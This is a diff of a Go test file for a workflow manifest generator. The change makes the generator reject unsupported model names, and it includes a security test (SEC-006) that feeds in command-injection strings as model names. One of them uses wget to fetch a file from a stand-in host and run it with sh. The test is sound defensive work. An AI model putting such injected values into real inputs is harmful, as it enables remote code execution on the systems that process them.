@@ -45,25 +45,54 @@ func TestGenerateWorkflowRequiresImageOrModel(t *testing.T) {
 	}
 }
 
-func TestGenerateWorkflowUnknownModelDoesNotUseShell(t *testing.T) {
-	manifest, _, err := GenerateWorkflow(WorkflowRequest{
+func TestGenerateWorkflowRejectsUnknownModel(t *testing.T) {
+	manifest, summary, err := GenerateWorkflow(WorkflowRequest{
 		Name:  "train-custom",
 		Model: "custom-model-1",
+	})
+	if err == nil {
+		t.Fatal("expected error")
+	}
+	for _, want := range []string{"unsupported workflow model", "custom-model-1", "supported models: yolo, yolov11, yolov8", "params.image"} {
+		if !strings.Contains(err.Error(), want) {
+			t.Fatalf("error missing %q: %v", want, err)
+		}
+	}
+	requireNoWorkflowOutput(t, manifest, summary)
+}
+
+func TestGenerateWorkflowAllowsExplicitImageWithSafeArgv(t *testing.T) {
+	manifest, summary, err := GenerateWorkflow(WorkflowRequest{
+		Name:    "train-custom",
+		Task:    "train",
+		Model:   "custom-model-1",
+		Image:   "registry.example.com/ml/trainer:v1",
+		Command: []string{"python"},
+		Args:    []string{"train.py", "--epochs=1"},
 	})
 	if err != nil {
 		t.Fatal(err)
 	}
-	if strings.Contains(manifest, "/bin/sh") || strings.Contains(manifest, " -c") {
-		t.Fatalf("manifest should avoid shell launcher:\n%s", manifest)
+	for _, want := range []string{
+		"image: registry.example.com/ml/trainer:v1",
+		"command:",
+		"- python",
+		"args:",
+		"- train.py",
+		"- --epochs=1",
+	} {
+		if !strings.Contains(manifest, want) {
+			t.Fatalf("manifest missing %q:\n%s", want, manifest)
+		}
 	}
-	if !strings.Contains(manifest, "command:") || !strings.Contains(manifest, "- echo") {
-		t.Fatalf("manifest=%s", manifest)
+	if !strings.Contains(summary, "image=registry.example.com/ml/trainer:v1") {
+		t.Fatalf("summary=%q", summary)
 	}
 }
 
-// TestGenerateWorkflowInjectionShapedModelIsArgvSafe covers acceptance criterion 2 of SEC-006:
-// injection-shaped model strings must be passed as literal argv args, never evaluated by a shell.
-func TestGenerateWorkflowInjectionShapedModelIsArgvSafe(t *testing.T) {
+// TestGenerateWorkflowRejectsInjectionShapedUnknownModel keeps the SEC-006
+// security bar while ensuring unknown models cannot produce placeholder jobs.
+func TestGenerateWorkflowRejectsInjectionShapedUnknownModel(t *testing.T) {
 	maliciousModels := []string{
 		"$(touch /tmp/pwn)",
 		"`id`",
@@ -71,20 +100,21 @@ func TestGenerateWorkflowInjectionShapedModelIsArgvSafe(t *testing.T) {
 		"model && wget http://bad.example.com/x -O /tmp/x && sh /tmp/x",
 	}
 	for _, model := range maliciousModels {
-		manifest, _, err := GenerateWorkflow(WorkflowRequest{
+		manifest, summary, err := GenerateWorkflow(WorkflowRequest{
 			Name:  "train-custom",
 			Model: model,
 		})
-		if err != nil {
-			t.Fatalf("model=%q: unexpected error: %v", model, err)
+		if err == nil || !strings.Contains(err.Error(), "unsupported workflow model") {
+			t.Fatalf("model=%q: err=%v", model, err)
 		}
-		// Must use echo (argv-safe), never sh/bash/shell launcher
-		if strings.Contains(manifest, "/bin/sh") || strings.Contains(manifest, "bash -c") {
-			t.Fatalf("model=%q: manifest uses shell launcher:\n%s", model, manifest)
-		}
-		if !strings.Contains(manifest, "- echo") {
-			t.Fatalf("model=%q: manifest missing expected echo command:\n%s", model, manifest)
-		}
+		requireNoWorkflowOutput(t, manifest, summary)
+	}
+}
+
+func requireNoWorkflowOutput(t *testing.T, manifest, summary string) {
+	t.Helper()
+	if manifest != "" || summary != "" {
+		t.Fatalf("manifest=%q summary=%q, want no generated output", manifest, summary)
 	}
 }
 
